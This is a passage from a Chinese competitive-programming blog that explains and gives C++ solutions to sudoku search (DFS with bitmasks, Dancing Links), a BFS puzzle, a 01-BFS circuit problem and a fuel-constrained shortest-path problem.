16; ++i){        for(int j = 0; j &lt; 16; ++j){            if(map[i][j] != '-') continue;            int mask = bitmask(i, j);            int cnt = 16 - __builtin_popcount(mask);            if(cnt &lt; mini) mini = cnt, x = i, y = j;        }    }    int _now_ = stk.size();    int mask = bitmask(x, y);    for(int d = 1; d &lt;= 16; ++d){        if(mask &gt;&gt; d &amp; 1) continue;        make(x, y, d);        if(dfs(filled+1)) return true; // 递归猜测        undo(_now_);    }    undo(now); // 回溯 “可唯一确定的空”    return false; // 这种情况无解}\n\n这份代码只得了  分, 有一个测试点 T 飞了.\n啊? 这都过不了?\n冷静思考了一下, 用  层 for 循环去找只可填在 1 个空的字母 , 效率肯定低 (但我真的以为这个常数可以忽略不计呀呜呜). 需要更极致的优化.\n稍微动一下脑筋, 其实我们可以用两个掩码 once 和 twice 分别记录出现某一单元 至少出现  次和至少出现  次的候选数, 遍历单元格的时候, 对于当前格子的候选数掩码 , 先更新 twice |= (once &amp; s), 再更新 once |= s, 遍历结束后, once &amp; ~twice 就是只出现  次的候选数了.\n利用这个trick可以减少一重循环 .\n于是这个优化到可能只有正在写这篇题解时的我才能看懂的最终版本它来了:\nbool dfs(int filled){    int now = stk.size(); // 记录当前状态    bool opted = true; // 是否有操作    while(opted){        opted = false;        // 只有 1 个候选数的空        for(int i = 0; i &lt; 16; ++i){            for(int j = 0; j &lt; 16; ++j){                if(map[i][j] != '-') continue;                int mask = bitmask(i, j);                int cnt = 16 - __builtin_popcount(mask);                if(cnt == 1){                    int d = __builtin_ctz(131070 &amp; ~mask);                      make(i, j, d); ++filled; opted = true;                }            }        }        // 只可填在 1 个空的字母            // 检查每一行        for(int r = 0; r &lt; 16; ++r){            int once = 0, twice = 0;            int candidates[16];            for(int c = 0; c &lt; 16; ++c){                if(map[r][c] != '-') continue;                candidates[c] = ~bitmask(r, c) &amp; 131070;                twice |= (once &amp; candidates[c]); once |= candidates[c];            }            int cats = once &amp; ~twice;            if(cats){                for(int c = 0; c &lt; 16; ++c){                    if(map[r][c] != '-') continue;                    int single = cats &amp; candidates[c];                    if(single){                        int d = __builtin_ctz(single);                        make(r, c, d); ++filled; opted = true;                    }                }            }        }            // 检查每一列        for(int c = 0; c &lt; 16; ++c){            int once = 0, twice = 0;            int candidates[16];            for(int r = 0; r &lt; 16; ++r){                if(map[r][c] != '-') continue;                candidates[r] = ~bitmask(r, c) &amp; 131070;                twice |= (once &amp; candidates[r]); once |= candidates[r];            }            int cats = once &amp; ~twice;            if(cats){                for(int r = 0; r &lt; 16; ++r){                    if(map[r][c] != '-') continue;                    int single = cats &amp; candidates[r];                    if(single){                        int d = __builtin_ctz(single);                        make(r, c, d); ++filled; opted = true;                    }                }            }        }            // 检查每一个宫        for(int b1 = 0; b1 &lt; 4; ++b1){            for(int b2 = 0; b2 &lt; 4; ++b2){                int once = 0, twice = 0;                int candidates[16];                for(int i = 0; i &lt; 16; ++i) {                    int r = (b1 &lt;&lt; 2) | (i &gt;&gt; 2);                    int c = (b2 &lt;&lt; 2) | (i &amp; 3);                    if(map[r][c] == '-') {                        candidates[i] = ~bitmask(r,c) &amp; 131070;                        twice |= (once &amp; candidates[i]);                        once |= candidates[i];                    }                }                int cats = once &amp; ~twice;                if(cats){                    for(int i = 0; i &lt; 16; ++i){                        int r = (b1 &lt;&lt; 2) | (i &gt;&gt; 2);                        int c = (b2 &lt;&lt; 2) | (i &amp; 3);                        if(map[r][c] == '-') {                            int single = cats &amp; candidates[i];                            if(single){                                int d = __builtin_ctz(single);                                make(r, c, d); ++filled; opted = true;                            }                        }                    }                }            }        }        // 如果上面的操作导致矛盾, 就撤回        for(int i = 0; i &lt; 16; ++i){            for(int j = 0; j &lt; 16; ++j){                if(map[i][j] != '-') continue;                int mask = bitmask(i, j);                if(__builtin_popcount(mask) == 16){                    undo(now);                    return false;                }            }        }    }    // 填完了    if(filled == n){        for(int i = 0; i &lt; 16; ++i) std::cout &lt;&lt; map[i] &lt;&lt; std::endl;        return true;    }    // 启发式, 找候选数最少的空    int x = -1, y = -1, mini = 17;    for(int i = 0; i &lt; 16; ++i){        for(int j = 0; j &lt; 16; ++j){            if(map[i][j] != '-') continue;            int mask = bitmask(i, j);            int cnt = 16 - __builtin_popcount(mask);            if(cnt &lt; mini) mini = cnt, x = i, y = j;        }    }    int _now_ = stk.size();    int mask = bitmask(x, y);    for(int d = 1; d &lt;= 16; ++d){        if(mask &gt;&gt; d &amp; 1) continue;        make(x, y, d);        if(dfs(filled+1)) return true; // 递归猜测        undo(_now_);    }    undo(now); // 回溯 “可唯一确定的空”    return false; // 这种情况无解}\n\n折腾了一个晚上, 最终才以  ms 的时间通过此题.\n\n还是太菜了呜呜呜.\n\n    \n  \n\n\n6. 寻找林克的回忆(4) [DLX]\n  \n    \n      题意简述\n\n    \n    \n      同 5. 寻找林克的回忆(4)\n但题目名称引导使用 Dancing Links X Algorithm.\n前置知识: Dancing Links.\n\n    \n  \n\n\n    Solution \n    \n      这里默认读者已经会用 DLX 求解 01 精确覆盖问题 . 相关内容我已在博客的另一篇文章详细介绍, 这里不做赘述.\n首要问题是把数独问题转化为 01 精确覆盖问题.\n用三元组  表示数独的第  行, 第  列, 填入的是数字 , 这个条件等价于以下  条约束:\n\n行-数字约束: 第  行必须有数字 .\n列-数字约束: 第  列必须有数字 .\n宫-数字约束:  所在宫必须有数字 .\n唯一性约束: 格子  只能填一个数.\n\n又因为  取遍  ~  这  个数, 很容易知道上面这  条约束分别有  个, 因此总共就是  个约束.\n又因为  这个三元组就代表了一个选择, 一共可以有  个不同的三元组, 也就是说有  个选择.\n于是,  数独问题所对应的 01 精确覆盖问题 , 就可以转化为  行,  列的 Dancing Links进行求解.\n具体应该怎么进行呢?\n在读入之前, 先插入所有的  对  , 代表所有选择.\n然后, 在读入  时, 把读入的已填充位置视为 “强制选择”, 也就是在  个选择中必须选择  , 而一次选择就是一次dance, 我们需要划掉所有和  有矛盾的选择.\n最后, 再调用dance函数进行搜索求解.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;const int MAX_C = 16 * 16 * 4;const int MAX_R = 16 * 16 * 16;const int SIZE = MAX_C + MAX_R * 4 + 10;int stack[SIZE];char in[20];char map[17][17];char ans[17][17];int read(){\tint x = 0, f = 1; char ch = getchar();\tfor(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');\tfor(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);\treturn f ? x : -x;}struct DLX{\tint n, m, tot; // n * m的大小, tot是元素索引 \tint first[MAX_R + 10], size[MAX_C + 10];\tint up[SIZE], down[SIZE], left[SIZE], right[SIZE];\tint col[SIZE], raw[SIZE];\tbool FLAG;\t\tvoid build(const int &amp;r, const int &amp;c){\t\tn = r, m = c;\t\tfor(int i = 0; i &lt;= c; ++i){ // 1行, c列, 0是指示 \t\t\tleft[i] = i - 1, right[i] = i + 1;\t\t\tup[i] = down[i] = i;\t\t}\t\tleft[0] = c, right[c] = 0;\t\tFLAG = false;\t\ttot = c; // 漏了这行直接爆炸\t\tmemset(size, 0, sizeof(size));\t\tmemset(first, 0, sizeof(first)); \t}\t\tvoid remove(const int &amp;c){ // 删除第 c 列 \t\tright[left[c]] = right[c], left[right[c]] = left[c];\t\tfor(int i = down[c]; i != c; i = down[i]){ // 往下移动, 枚举 c 的每个元素 i, 删除 i 所在行. 因为是环状链表, 最后会绕回 c \t\t\tfor(int j = right[i]; j != i; j = right[j]){ // 往右移动, 因为是环状链表, 最后会绕回 i\t\t\t\tdown[up[j]] = down[j], up[down[j]] = up[j];\t\t\t\t--size[col[j]]; // 别忘了减掉列大小 \t\t\t}\t\t}  \t}\t\tvoid recover(const int &amp;c){ // 恢复第 c 列, 与 remove 操作完全相反 \t\tfor(int i = up[c]; i != c; i = up[i]){\t\t\tfor(int j = left[i]; j != i; j = left[j]){\t\t\t\tdown[up[j]] = up[down[j]] = j, ++size[col[j]];\t\t\t}\t\t}\t\tright[left[c]] = left[right[c]] = c;\t} \t\tvoid insert(const int &amp;r, const int &amp;c){        raw[++tot] = r, col[tot] = c, ++size[c];        down[tot] = down[c], up[tot] = c;        up[down[c]] = tot, down[c] = tot;        if(!first[r]) first[r] = left[tot] = right[tot] = tot;        else{            left[tot] = first[r];            right[tot] = right[first[r]];            left[right[first[r]]] = tot;            right[first[r]] = tot;        }    }    void dance(int step){\t\tif(FLAG) return;        if(!right[0]){\t\t\t// 复制原有解\t\t\tfor(int i = 0; i &lt; 16; ++i) for(int j = 0; j &lt; 16; ++j) ans[i][j] = map[i][j];            // 转换为答案\t\t\tfor(int i = 0; i &lt; step; ++i){\t\t\t\tconst int r = stack[i] &gt;&gt; 8;\t\t\t\tconst int c = (stack[i] &amp; 0xff) &gt;&gt; 4; \t\t\t\tconst int d = stack[i] &amp; 0xf;\t\t\t\tans[r][c] = 'A' + d;\t\t\t}\t\t\tFLAG = true; return;        }        int c = right[0];        for(int i = right[0]; i; i = right[i]) if(size[i] &lt; size[c]) c = i;        remove(c);        for(int i = down[c]; i != c; i = down[i]){            stack[step] = raw[i];            for(int j = right[i]; j != i; j = right[j]) remove(col[j]);            dance(step+1); if(FLAG) return;            for(int j = left[i]; j != i; j = left[j]) recover(col[j]);        }         recover(c);    }}solver;void Insert(int x, int y, int z){\t// (x, y, z) 映射为一维(行)\tint r = (x &lt;&lt; 8) | (y &lt;&lt; 4) | z; \t\t// 行-数字约束: 第 x 行必须有数字 z, 把 (行, 数字) 映射到 [1, 256]\tsolver.insert(r, x * 16 + z + 1);\t// 列-数字约束: 第 y 列必须有数字 z, 把 (列, 数字) 映射到 (256, 512]\tsolver.insert(r, y * 16 + z + 256 + 1);\t// 宫格-数字约束: (x, y) 所在的宫格必须有数字 z.\t// 这个宫格的坐标是 (x / 4, y / 4), 映射为一维就是 (x / 4) * 4 + (y / 4)\tconst int block = (x / 4) * 4 + (y / 4);\t// 那么, ([x / 4, y / 4], z) 就映射到 (512, 768]\tsolver.insert(r, block * 16 + z + 512 + 1);\t// 格子只能填一次约束, 映射到 (768, 1024]\tsolver.insert(r, x * 16 + y + 768 + 1);}void solve(){\tsolver.build(MAX_R, MAX_C);\t// 全空约束, 即插入所有可能性\tfor(int i = 0; i &lt; 16; ++i){\t\tfor(int j = 0; j &lt; 16; ++j){\t\t\tfor(int d = 0; d &lt; 16; ++d){\t\t\t\tInsert(i, j, d);\t\t\t}\t\t}\t}\t// 硬性约\tfor(int i = 0; i &lt; 16; ++i){\t\tfor(int j = 0; j &lt; 16; ++j){\t\t\tif(map[i][j] != '-'){ // 强制选择这一行, 也就是进行一次 dance\t\t\t\tconst int d = map[i][j] - 'A';\t\t\t\tconst int r = (i &lt;&lt; 8) | (j &lt;&lt; 4) | d;\t\t\t\tconst int c1 = i * 16 + d + 1;\t\t\t\t\t\t\t\tint target = -1;\t\t\t\tfor(int k = solver.down[c1]; k != c1; k = solver.down[k]){\t\t\t\t\tif(solver.raw[k] == r){target = k; break;}\t\t\t\t}\t\t\t\tif(target == -1) continue;\t\t\t\tsolver.remove(c1);\t\t\t\tfor(int k = solver.right[target]; k != target; k = solver.right[k])\t\t\t\t\tsolver.remove(solver.col[k]);\t\t\t}\t\t}\t}\tsolver.dance(0);\tfor(int i = 0; i &lt; 16; ++i) std::cout &lt;&lt; ans[i] &lt;&lt; std::endl;}int main(){//\tfreopen(\"input.txt\", \"r\", stdin);\tint i = 0;\twhile(std::cin &gt;&gt; in){\t\tstrcpy(map[i++], in);\t\tif(i == 16){solve(); i = 0;}\t}}\n\n这份代码比上一题的 DFS 快, 只用了  ms.\n\n    \n  \n\n\n7. 寻找林克的回忆(3) 传送门 -- 洛谷 P1074 [NOIP 2009 提高组] 靶形数独\n\n\n  \n    \n      题意简述\n\n    \n    \n      给定一个  的数独, 每个格子有不同的得分:\n\n正中心的格子为  分.\n最外面一圈的格子为  分, 从中间往外面每圈的格子分数依次递减.\n\n示意图:\n\n总分值为每个方格的分值和填在格子中的数字的乘积之和, 即 格子分值填入的数字 , 试求出最大得分.\n\n    \n  \n\n\n    Solution \n    \n      使用目前最快的 DLX 算法来求解数独, 每得到一组可行解就更新最大得分即可.\n抄抄板就行, 唯一的改动只有 dance 函数中对 right[0] == 0 的处理.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#define N 9const int MAX_C = N * N * 4;const int MAX_R = N * N * N;const int SIZE = MAX_C + MAX_R * 4 + 10;int stack[SIZE];int map[N+1][N+1];int sol[N+1][N+1];long long ans = -1;int read(){\tint x = 0, f = 1; char ch = getchar();\tfor(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');\tfor(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);\treturn f ? x : -x;}int sqrt(int x){    if(x == 1) return 1;    if(x == 4) return 2;    if(x == 9) return 3;    if(x == 16) return 4;    if(x == 25) return 5;    return 114514;}int get_score(int r, int c, int d){    if(r == 0 || r == N-1 || c == 0 || c == N-1) return d * 6;    if(r == 1 || r == N-2 || c == 1 || c == N-2) return d * 7;    if(r == 2 || r == N-3 || c == 2 || c == N-3) return d * 8;    if(r == 3 || r == N-4 || c == 3 || c == N-4) return d * 9;    if(r == 4 || r == N-5 || c == 4 || c == N-5) return d * 10;    return 0;}struct DLX{\tint n, m, tot; // n * m的大小, tot是元素索引 \tint first[MAX_R + 10], size[MAX_C + 10];\tint up[SIZE], down[SIZE], left[SIZE], right[SIZE];\tint col[SIZE], raw[SIZE];\t\tvoid build(const int &amp;r, const int &amp;c){\t\tn = r, m = c;\t\tfor(int i = 0; i &lt;= c; ++i){ // 1行, c列, 0是指示 \t\t\tleft[i] = i - 1, right[i] = i + 1;\t\t\tup[i] = down[i] = i;\t\t}\t\tleft[0] = c, right[c] = 0;\t\ttot = c; // 漏了这行直接爆炸\t\tmemset(size, 0, sizeof(size));\t\tmemset(first, 0, sizeof(first)); \t}\t\tvoid remove(const int &amp;c){ // 删除第 c 列 \t\tright[left[c]] = right[c], left[right[c]] = left[c];\t\tfor(int i = down[c]; i != c; i = down[i]){ // 往下移动, 枚举 c 的每个元素 i, 删除 i 所在行. 因为是环状链表, 最后会绕回 c \t\t\tfor(int j = right[i]; j != i; j = right[j]){ // 往右移动, 因为是环状链表, 最后会绕回 i\t\t\t\tdown[up[j]] = down[j], up[down[j]] = up[j];\t\t\t\t--size[col[j]]; // 别忘了减掉列大小 \t\t\t}\t\t}  \t}\t\tvoid recover(const int &amp;c){ // 恢复第 c 列, 与 remove 操作完全相反 \t\tfor(int i = up[c]; i != c; i = up[i]){\t\t\tfor(int j = left[i]; j != i; j = left[j]){\t\t\t\tdown[up[j]] = up[down[j]] = j, ++size[col[j]];\t\t\t}\t\t}\t\tright[left[c]] = left[right[c]] = c;\t} \t\tvoid insert(const int &amp;r, const int &amp;c){        raw[++tot] = r, col[tot] = c, ++size[c];        down[tot] = down[c], up[tot] = c;        up[down[c]] = tot, down[c] = tot;        if(!first[r]) first[r] = left[tot] = right[tot] = tot;        else{            left[tot] = first[r];            right[tot] = right[first[r]];            left[right[first[r]]] = tot;            right[first[r]] = tot;        }    }    void dance(int step){        if(!right[0]){\t\t\t// 复制原有解\t\t\tfor(int i = 0; i &lt; N; ++i) for(int j = 0; j &lt; N; ++j) sol[i][j] = map[i][j];            // 转换为答案\t\t\tfor(int i = 0; i &lt; step; ++i){\t\t\t\tconst int val = stack[i];                const int r = val / (N * N);                const int c = (val / N) % N;                const int d = val % N;                sol[r][c] = d + 1;\t\t\t}            long long res = 0;            for(int i = 0; i &lt; N; ++i) for(int j = 0; j &lt; N; ++j)                res += get_score(i, j, sol[i][j]);\t\t    ans = std::max(ans, res);            return;        }        int c = right[0];        for(int i = right[0]; i; i = right[i]) if(size[i] &lt; size[c]) c = i;        remove(c);        for(int i = down[c]; i != c; i = down[i]){            stack[step] = raw[i];            for(int j = right[i]; j != i; j = right[j]) remove(col[j]);            dance(step+1);            for(int j = left[i]; j != i; j = left[j]) recover(col[j]);        }         recover(c);    }}solver;void Insert(int x, int y, int z){    int r = x * N * N + y * N + z;\tsolver.insert(r, x * N + z + 1);\tsolver.insert(r, y * N + z + N * N + 1);\tconst int block_size = sqrt(N);    const int block = (x / block_size) * block_size + (y / block_size);\tsolver.insert(r, block * N + z + N * N * 2 + 1);\tsolver.insert(r, x * N + y + N * N * 3 + 1);}void solve(){\tsolver.build(MAX_R, MAX_C);\tfor(int i = 0; i &lt; N; ++i){\t\tfor(int j = 0; j &lt; N; ++j){\t\t\tfor(int d = 0; d &lt; N; ++d){\t\t\t\tInsert(i, j, d);\t\t\t}\t\t}\t}\tfor(int i = 0; i &lt; N; ++i){\t\tfor(int j = 0; j &lt; N; ++j){\t\t\tif(map[i][j]){\t\t\t\tint d = map[i][j] - 1;                const int r = i * N * N + j * N + d;\t\t\t\tconst int c1 = i * N + d + 1;\t\t\t\t\t\t\t\tint target = -1;\t\t\t\tfor(int k = solver.down[c1]; k != c1; k = solver.down[k]){\t\t\t\t\tif(solver.raw[k] == r){target = k; break;}\t\t\t\t}\t\t\t\tif(target == -1) continue;\t\t\t\tsolver.remove(c1);\t\t\t\tfor(int k = solver.right[target]; k != target; k = solver.right[k])\t\t\t\t\tsolver.remove(solver.col[k]);\t\t\t}\t\t}\t}\tsolver.dance(0);\tprintf(\"%lld\\n\", ans);}int main(){//\tfreopen(\"in.txt\", \"r\", stdin);    std::ios::sync_with_stdio(false);\tfor(int i = 0; i &lt; 9; ++i){        for(int j = 0; j &lt; 9; ++j){            std::cin &gt;&gt; map[i][j];        }    }    solve();}\n\n    \n  \n\n\n8. 滚石柱 传送门\n\n\n  \n    \n      题意简述\n\n    \n    \n      不知道怎么简述, 所以我直接把题目搬过来了:\n\n\n    \n  \n\n\n    Solution \n    \n      没啥思维难度, 如果像我一样是用石柱放置形式 + 一个坐标来描述石柱位置的话, 在翻转时要正确处理好下一个坐标 .\n需要分好几种情况进行讨论, 代码相对繁琐.\nAC Code:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;unordered_map&gt;int n, m, o1, o2;char map[505][505];enum State{TANG_H, TANG_V, LI};struct Stone{    State state;    int x, y;    // 如果是LI, (x, y) 表示触底点坐标    // 如果是TANG_H, (x, y) 表示左边点坐标    // 如果是TANG_V, (x, y) 表示上边点坐标    long long to_ll(){        return (long long)state * 1145141919LL + x * 501 + y;    }}stone;std::unordered_map&lt;long long, bool&gt; vis;void bfs(){    vis.clear();    std::queue&lt;std::pair&lt;Stone, int&gt;&gt; q;    q.push({stone, 0});    vis[stone.to_ll()] = true;    while(q.size()){        Stone s = q.front().first;        int step = q.front().second;        q.pop();        if(s.x == o1 and s.y == o2 and s.state == LI){            printf(\"%d\\n\", step);            return;        }        if(s.state == LI){            // 上            if(s.x &gt; 1 and map[s.x - 1][s.y] != '#' and map[s.x - 2][s.y] != '#'){                Stone tmp = s; tmp.x -= 2; tmp.state = TANG_V;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }            // 下            if(s.x &lt; n - 2 and map[s.x + 1][s.y] != '#' and map[s.x + 2][s.y] != '#'){                Stone tmp = s; ++tmp.x; tmp.state = TANG_V;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }            // 左            if(s.y &gt; 1 and map[s.x][s.y - 1] != '#' and map[s.x][s.y - 2] != '#'){                Stone tmp = s; tmp.y -= 2; tmp.state = TANG_H;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }            // 右            if(s.y &lt; m - 2 and map[s.x][s.y + 1] != '#' and map[s.x][s.y + 2] != '#'){                Stone tmp = s; ++tmp.y; tmp.state = TANG_H;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }        }        else if(s.state == TANG_H){            // 上            if(s.x &gt; 0 and map[s.x - 1][s.y] != '#' and map[s.x - 1][s.y + 1] != '#'){                Stone tmp = s; --tmp.x;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }            // 下            if(s.x &lt; n - 1 and map[s.x + 1][s.y] != '#' and map[s.x + 1][s.y + 1] != '#'){                Stone tmp = s; ++tmp.x;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }            // 左            if(s.y &gt; 0 and map[s.x][s.y - 1] != '#' and map[s.x][s.y - 1] != 'E'){                Stone tmp = s; --tmp.y; tmp.state = LI;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }            // 右            if(s.y &lt; m - 2 and map[s.x][s.y + 2] != '#' and map[s.x][s.y + 2] != 'E'){                Stone tmp = s; tmp.y += 2; tmp.state = LI;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }        }        else if(s.state == TANG_V){            // 左            if(s.y &gt; 0 and map[s.x][s.y - 1] != '#' and map[s.x + 1][s.y - 1] != '#'){                Stone tmp = s; --tmp.y;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }            // 右            if(s.y &lt; m - 1 and map[s.x][s.y + 1] != '#' and map[s.x + 1][s.y + 1] != '#'){                Stone tmp = s; ++tmp.y;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }            // 上            if(s.x &gt; 0 and map[s.x - 1][s.y] != '#' and map[s.x - 1][s.y] != 'E'){                Stone tmp = s; --tmp.x; tmp.state = LI;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }            // 下            if(s.x &lt; n - 2 and map[s.x + 2][s.y] != '#' and map[s.x + 2][s.y] != 'E'){                Stone tmp = s; tmp.x += 2; tmp.state = LI;                if(!vis[tmp.to_ll()]) q.push({tmp, step + 1}), vis[tmp.to_ll()] = true;            }        }    }    printf(\"Impossible\\n\");}int main(){//    freopen(\"in.txt\", \"r\", stdin);    while(~scanf(\"%d%d\", &amp;n, &amp;m) and n and m){        stone.x = stone.y = -1;        for(int i = 0; i &lt; n; ++i){            for(int j = 0; j &lt; m; ++j){                char ch = ' ';                while(ch == ' ' or ch == '\\n') ch = getchar();                map[i][j] = ch;                if(ch == 'O') o1 = i, o2 = j;                if(ch == 'X'){                    if(stone.x == -1) stone.x = i, stone.y = j, stone.state = LI;                    else{                        if(stone.x == i - 1 or stone.x == i + 1) stone.state = TANG_V;                        else stone.state = TANG_H;                    }                }            }        }        bfs();    }}\n\n    \n  \n\n\n9. 维修电路 传送门 -- 洛谷 P4667\n\n\n  \n    \n      题意简述\n\n    \n    \n      简述不了, 进传送门看题吧.\n\n    \n  \n\n\n    Solution \n    \n      解决此类问题的基本思想在我的博客中已有记载.\n不要被洛谷的神秘标签带偏了, 这只是01 BFS.\n\n从一个格子沿对角线可以走到其它  个格子, 其中有  种走法不需要转动电线,  种走法需要转动电线. (假设这个格子不在边界上)\n我们知道, BFS的层序遍历特点能保证终点第一次被访问时就是最优解, 但如果我们在遍历时同时把这  种走法都放进队首拓展, 就会破坏这样的最优解性质, 因为先被访问的点不一定有最少的转动电线次数.\n为了维护BFS的最优解性质, 我们每次:\n\n把不需要转动电线的走法放到队首.\n把需要转动电线的走法放到队尾.\n\n再取队首拓展, 就能保证每次拓展的点都是最优解.\n然后要注意格点和格子的坐标关系, 这个自己画图就懂了, 我不做赘述.\n已在代码里附上错误的 DFS 代码, 可思考为什么这种 DFS 写法是错误的.\nAC Code:\n#include &lt;deque&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;int T;int n, m;char map[505][505];int f[505][505];void dfs(int x, int y, int step){        if(step &gt;= f[x][y] or step &gt; n + m) return;        f[x][y] = step;        if(x &gt; 0 and y &gt; 0 and map[x][y] != '/') dfs(x-1, y-1, step);        if(x &lt; n and y &lt; m and map[x+1][y+1] != '/') dfs(x+1, y+1, step);        if(x &gt; 0 and y &lt; m and map[x][y+1] == '/') dfs(x-1, y+1, step);        if(x &lt; n and y &gt; 0 and map[x+1][y] == '/') dfs(x+1, y-1, step);        if(x &gt; 0 and y &gt; 0 and map[x][y] == '/') dfs(x-1, y-1, step+1);        if(x &lt; n and y &lt; m and map[x+1][y+1] == '/') dfs(x+1, y+1, step+1);        if(x &gt; 0 and y &lt; m and map[x][y+1] != '/') dfs(x-1, y+1, step+1);        if(x &lt; n and y &gt; 0 and map[x+1][y] != '/') dfs(x+1, y-1, step+1);}struct State{    int x, y, step;};bool bfs(){    std::deque&lt;State&gt; q;    q.push_front({0, 0});    while(q.size()){        State cur = q.front(); q.pop_front();        if(cur.x == n and cur.y == m){            printf(\"%d\\n\", cur.step);            return true;        }        f[cur.x][cur.y] = 0;        if(cur.x &gt; 0 and cur.y &gt; 0 and map[cur.x][cur.y] != '/' and f[cur.x-1][cur.y-1]) q.push_front({cur.x-1, cur.y-1, cur.step});        if(cur.x &lt; n and cur.y &lt; m and map[cur.x+1][cur.y+1] != '/' and f[cur.x+1][cur.y+1]) q.push_front({cur.x+1, cur.y+1, cur.step});        if(cur.x &gt; 0 and cur.y &lt; m and map[cur.x][cur.y+1] == '/' and f[cur.x-1][cur.y+1]) q.push_front({cur.x-1, cur.y+1, cur.step});        if(cur.x &lt; n and cur.y &gt; 0 and map[cur.x+1][cur.y] == '/' and f[cur.x+1][cur.y-1]) q.push_front({cur.x+1, cur.y-1, cur.step});        if(cur.x &gt; 0 and cur.y &gt; 0 and map[cur.x][cur.y] == '/' and f[cur.x-1][cur.y-1]) q.push_back({cur.x-1, cur.y-1, cur.step+1});        if(cur.x &lt; n and cur.y &lt; m and map[cur.x+1][cur.y+1] == '/' and f[cur.x+1][cur.y+1]) q.push_back({cur.x+1, cur.y+1, cur.step+1});        if(cur.x &gt; 0 and cur.y &lt; m and map[cur.x][cur.y+1] != '/' and f[cur.x-1][cur.y+1]) q.push_back({cur.x-1, cur.y+1, cur.step+1});        if(cur.x &lt; n and cur.y &gt; 0 and map[cur.x+1][cur.y] != '/' and f[cur.x+1][cur.y-1]) q.push_back({cur.x+1, cur.y-1, cur.step+1});    }    return false;}void solve(){    std::cin &gt;&gt; n &gt;&gt; m;    for(int i = 1; i &lt;= n; ++i){        for(int j = 1; j &lt;= m; ++j){            char ch = ' ';            while(ch != '\\\\' and ch != '/') ch = getchar();            map[i][j] = ch;        }    }    memset(f, 0x3f, sizeof(f));    if(!bfs()) puts(\"NO SOLUTION\");}int main(){//    freopen(\"in.txt\", \"r\", stdin);    std::cin &gt;&gt; T;    while(T--) solve();}\n\n    \n  \n\n\n10. 最省赛程\n  \n    \n      题意简述\n\n    \n    \n      有  个城市,  条双向道路, 第  座城市的单位油价为 , 通过第  条道路需消耗  的油.\n回答  个询问, 每个询问会给出三个数 , , , 分别表示油箱容量, 起点城市编号, 终点城市编号.\n初始油箱为空, 求从起点到终点所需最小花费.\n若无法到达终点, 输出 impossible .\n数据范围:\n\n\n    \n  \n\n\n    Solution \n    \n      既有油量又有价格, 似乎是个二元问题.\n考虑状态  , 其中  表示当前城市,  表示当前油量,  表示抵达当前城市的花费. 显然, 对相同的城市  和相同的  , 我们会想要最小化  .\n而状态可以由这两条路径进行转移:\n\n在该城市加  单位的油, 状态变成  .\n选择走油耗为  的道路前往城市  , 状态变成  .\n\n相比于普通的 Dijkstra, 我们只需要把原来表示距离的数组 dis[N] 拓展为二维 dis[C][N] 即可.\n也可以换一种角度理解: 把每个点拆成  个点, 除了可以在城市与城市之间走, 也可以花费  从  走到  . \n单次询问的时间复杂度为 .\n如果所有输入都取到上界的话, 应该是过不了的, 不过我也想不到更优秀的解法了, 实测数据并没有这么强, 这样的思路是可以通过的.\nAC Code:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#define N 1001#define M 10001#define C 101int n, m, tot;int q, c, s, e;long long cost[C][N];int price[N];int head[N], nxt[M &lt;&lt; 1], ver[M &lt;&lt; 1], edge[M &lt;&lt; 1];struct State{    long long res; // 当前花费    int city;    int fuel;    bool operator &lt; (const State&amp; other) const {        return res &gt; other.res;    }};int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch);  ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}void add(int x, int y, int z){    ver[++tot] = y, edge[tot] = z, nxt[tot] = head[x], head[x] = tot;}void solve(){    memset(cost, 0x3f, sizeof(cost));//    cost[s][0] = 0;    cost[0][s] = 0;    std::priority_queue&lt;State&gt; q;    q.push({0, s, 0});    while(q.size()){        State x = q.top(); q.pop();        if(x.res &gt; cost[x.fuel][x.city]) continue;        // 加油        if(x.fuel &lt; c){            long long cur = x.res + price[x.city];            if(cur &lt; cost[x.fuel + 1][x.city]){                cost[x.fuel + 1][x.city] = cur;                q.push({cur, x.city, x.fuel + 1});            }        }        // 走人        for(int i = head[x.city]; i; i = nxt[i]){            int y = ver[i], z = edge[i];            if(x.fuel &gt;= z){ // 油够                if(x.res &lt; cost[x.fuel - z][y]){                    cost[x.fuel - z][y] = x.res;                    q.push({x.res, y, x.fuel - z});                }            }        }    }    long long ans = 1145141919810LL;    for(int i = 0; i &lt;= c; ++i) ans = std::min(ans, cost[i][e]);    if(ans == 1145141919810LL) printf(\"impossible\\n\");    else printf(\"%lld\\n\", ans);}int main(){    n = read(), m = read();    for(int i = 0; i &lt; n; ++i) price[i] = read();    for(int i = 1; i 